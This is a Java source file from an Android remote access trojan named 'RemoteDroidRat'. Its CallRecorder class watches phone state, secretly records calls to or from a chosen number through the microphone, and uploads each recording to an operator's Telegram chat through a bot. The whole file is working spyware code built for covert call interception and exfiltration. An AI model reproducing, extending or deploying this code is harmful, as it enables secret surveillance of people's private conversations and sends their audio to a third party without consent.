package com.KaranKumar.RemoteDroidRat.commandActions;

import android.telephony.TelephonyManager;
import android.media.MediaRecorder;
import android.telephony.PhoneStateListener;
import android.content.Context;
import java.io.IOException;
import android.content.SharedPreferences;
import com.KaranKumar.RemoteDroidRat.adminInfo;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import java.io.File;
import com.KaranKumar.RemoteDroidRat.telegramBot.TelegramBotApi;

public class CallRecorder {
	private Context context;
    private String targetPhoneNumber;
    private TelephonyManager telephonyManager;
    private MediaRecorder mediaRecorder;
	private SharedPreferences call;
	private adminInfo admin;
	private TelegramBotApi telegramBot;
	private String path;

    public CallRecorder(Context context) {
		this.context = context;
		this.admin = new adminInfo(context);
		this.call = context.getSharedPreferences("RecordCall", context.MODE_PRIVATE);
        this.targetPhoneNumber = call.getString("RecordNumber", admin.getMobileNo());
		this.telegramBot = new TelegramBotApi(context);
    }

    public void startCallListener() {

        telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        PhoneStateListener callListener = new PhoneStateListener() {
            @Override
            public void onCallStateChanged(int state, String phoneNumber) {
                switch (state) {
                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        if (phoneNumber.equals(targetPhoneNumber)) {
							try {
								path = getAudioFilePath(phoneNumber);
							} catch (Exception e) {
								e.printStackTrace();
							}
							try {
								startRecording(path);
							} catch (Exception e) {
								e.printStackTrace();
							}
                        }
                        break;
                    case TelephonyManager.CALL_STATE_IDLE:
						try {
							stopRecording(path);
						} catch (Exception e) {
							e.printStackTrace();
						}

                        break;
                }
            }
        };
        telephonyManager.listen(callListener, PhoneStateListener.LISTEN_CALL_STATE);
    }

    private void startRecording(String path) {
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        mediaRecorder.setOutputFile(path);

        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void stopRecording(String path) {
        if (mediaRecorder != null) {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
			sendAudioToTelegramBot(admin.getChatId(), path);
        }
    }

	private String getAudioFilePath(String number) {
        return context.getFilesDir() + File.separator + "call-Recorded_" + number + ".3gp";
    }

    private void sendAudioToTelegramBot(String chatId, String audioFilePath) {
        if (isNetworkConnected()) {
			try {
				telegramBot.sendAudio(chatId, audioFilePath);
			} catch (Exception e) {
				e.printStackTrace();
			}
        }
    }

    private boolean isNetworkConnected() {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mobileNetworkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        return mobileNetworkInfo != null && mobileNetworkInfo.isConnected();
    }


}
